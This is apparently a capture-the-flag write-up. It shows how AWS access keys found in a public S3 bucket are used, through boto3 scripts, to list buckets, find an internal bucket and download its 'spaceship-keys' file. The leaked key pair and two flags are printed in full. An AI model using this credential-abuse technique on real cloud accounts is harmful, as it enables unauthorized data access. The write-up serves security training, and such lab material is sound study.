# TEASER: Locked out

## challenge information

> After a relaxing space walk, you realize that you have been locked out of your spaceship by the spaceship's AI. Thankfully, you remember that you prepared for this eventuality by storing access keys in an external storage.

opening the external storage we see:

```xml
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<ListBucketResult>
<Name>external-spaceship-storage-b38e8c6</Name>
<Prefix/>
<Marker/>
<MaxKeys>1000</MaxKeys>
<IsTruncated>false</IsTruncated>
<Contents>
<Key>external-spaceship-storage.txt</Key>
<LastModified>2021-06-24T18:36:04.000Z</LastModified>
<ETag>"0acc4ebca6124adf3f29d5be7ababed8"</ETag>
<Size>89</Size>
<StorageClass>STANDARD</StorageClass>
</Contents>
</ListBucketResult>
```

this bucket has a contents of:

- `external-spaceship-storage.txt`

viewing the file we get the first flag and keys:

```
AKIAQD6AU4VDTDJRGXRE
+BAPTBu9QFX6TVSpjerFoIJiJJr1D+c210ZyKdqv
CTF{6c2c45330a85b126f551}
```

flag 1: CTF{6c2c45330a85b126f551}

access key: AKIAQD6AU4VDTDJRGXRE

secret access key: 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

using these keys we can authenticate and browse for other buckets using the python3 library boto3

```py
import boto3

_PUBLIC_BUCKET_NAME = 'external-spaceship-storage-b38e8c6'

client = boto3.client('s3', aws_access_key_id='AKIAQD6AU4VDTDJRGXRE',
                            aws_secret_access_key='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')

print(client.list_buckets())

```

this shows us there is an internal bucket

```py
{
    "ResponseMetadata": {
        "RequestId": "GYFDXHQSTBHGAFQ7",
        "HostId": "F2 gIhVdNB/NOiHBz6ybQ5GnnFushjvGunATOfHK5M44adlmwcng8ZHxo9HQhXcIjuyFajg3Wlc=",
        "HTTPStatusCode": 200,
        "HTTPHeaders": {
            "x-amz-id-2": "F2 gIhVdNB/NOiHBz6ybQ5GnnFushjvGunATOfHK5M44adlmwcng8ZHxo9HQhXcIjuyFajg3Wlc=",
            "x-amz-request-id": "GYFDXHQSTBHGAFQ7",
            "date": "Sat, 03 Jul 2021 10:04:54 GMT",
            "content-type": "application/xml",
            "transfer-encoding": "chunked",
            "server": "AmazonS3",
        },
        "RetryAttempts": 0,
    },
    "Buckets": [
        {
            "Name": "external-spaceship-storage-b38e8c6",
            "CreationDate": datetime.datetime(2021, 6, 24, 18, 35, 58, tzinfo=tzutc()),
        },
        {
            "Name": "internal-spaceship-storage-fdde98f",
            "CreationDate": datetime.datetime(2021, 6, 24, 18, 35, 27, tzinfo=tzutc()),
        },
    ],
    "Owner": {
        "DisplayName": "spacerace1",
        "ID": "c3b61cad169180ae38e41493ac2dbd135955137780f02dc59b9e91b335a29a6b",
    },
}

```
- **"Name": "internal-spaceship-storage-fdde98f",**

now that we know the internal bucket name we can read it's contents
```py
import boto3

_BUCKET_NAME = 'internal-spaceship-storage-fdde98f'

client = boto3.client('s3', aws_access_key_id='AKIAQD6AU4VDTDJRGXRE',
                            aws_secret_access_key='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')

def ListFiles(client):
    """List files in specific S3 URL"""
    response = client.list_objects(Bucket=_BUCKET_NAME)
    for content in response.get('Contents', []):
        yield content.get('Key')

file_list = ListFiles(client)
for file in file_list:
    print('File found: %s' % file)
```

we find one file, `spaceship-keys`

now simply download this file and read it:
```py
import boto3


_BUCKET_NAME = 'internal-spaceship-storage-fdde98f'

client = boto3.client('s3', aws_access_key_id='AKIAQD6AU4VDTDJRGXRE',
                            aws_secret_access_key='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')

client.download_file(Filename='spaceship-keys', Bucket=_BUCKET_NAME, Key='spaceship-keys')

```

flag 2: CTF{4ababede5580d9a22a2a}
